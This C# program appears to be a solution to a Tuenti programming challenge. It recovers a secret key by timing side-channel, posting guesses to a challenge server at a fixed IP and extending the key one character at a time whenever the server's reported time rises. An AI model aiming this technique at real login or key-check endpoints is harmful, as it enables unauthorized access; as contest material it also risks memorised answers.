using System;
using System.Collections.Generic;
using System.Globalization;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace _13.TuentiTimingAuth
{
    class Program
    {
        static void Main(string[] args)
        {           
            string alphabet = "abcdefghijklmnopqrstuvwxyz0123456789";

            HttpClient client = new HttpClient();

            bool found = false;

            string key = "";
            double lastTime = 1.0;

            while (!found)
            {
                Dictionary<char, double> timesDictionary = new Dictionary<char, double>();             

                foreach (var v in alphabet)
                {
                    var content = new FormUrlEncodedContent(new[] 
                        {
                            new KeyValuePair<string, string>("input", "d26185ca19"),
                            new KeyValuePair<string, string>("key", key + v)
                        });
                    var response = client.PostAsync("http://54.83.207.90:4242/?debug=1", content).Result;

                    var result = response.Content.ReadAsStringAsync().Result;

                    if (!result.Contains("wrong"))
                    {
                        found = true;
                        Console.WriteLine(key+v);
                        break;
                    }
                    else
                    {
                        var timestring = Regex.Match(result, @"([\d])*\.[\d]+(e[-+][\d]+)?").Value;
                        double time = double.Parse(timestring, CultureInfo.InvariantCulture);

                        if (time >= lastTime * 1.1)
                        {
                            key = key + v;
                            lastTime = time;
                            break;
                        }
                        else
                            lastTime = time;
                    }
                }
            }
        }

    }
}
